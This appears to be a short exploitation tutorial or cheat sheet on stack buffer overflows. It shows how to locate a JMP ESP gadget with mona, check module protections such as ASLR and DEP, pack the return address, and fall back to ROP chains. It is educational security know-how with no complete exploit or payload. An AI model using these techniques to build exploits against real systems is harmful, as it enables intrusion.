# Buffer Overflow: Finding JMP ESP

After controlling EIP, you need to redirect execution to your shellcode.

## Find JMP ESP with Mona
```bash
# Find JMP ESP / CALL ESP / PUSH ESP; RET instructions
# Exclude bad characters with -cpb:
!mona jmp -r esp -cpb "\x00\x0a"

# Or manually search for the bytes \xff\xe4 (JMP ESP)
!mona find -s "\xff\xe4" -cpb "\x00\x0a"
```

## Check Module Protections
```bash
# List all loaded modules and their protections
!mona modules

# Look for:
# - A .dll or .exe loaded by the application
# - That does NOT have: ASLR, DEP, SafeSEH, Rebase
# - With a .text section that's executable

# Pick an address from a module without protections
```

## JMP ESP Address
```python
import struct

# Example JMP ESP address: 0x625011AF
# Format as little-endian bytes
jmp_esp = struct.pack("<I", 0x625011AF)

# In the exploit:
# buffer = A's + jmp_esp + NOPs + shellcode
```

## If No JMP ESP Available
- **DEP enabled**: Use ROP chains instead
  ```bash
  !mona rop -m *.dll -cpb "\x00\x0a"
  ```
- **ASLR only**: Pick a module WITHOUT ASLR
- **Both DEP + ASLR**: Need ROP chain from non-ASLR module
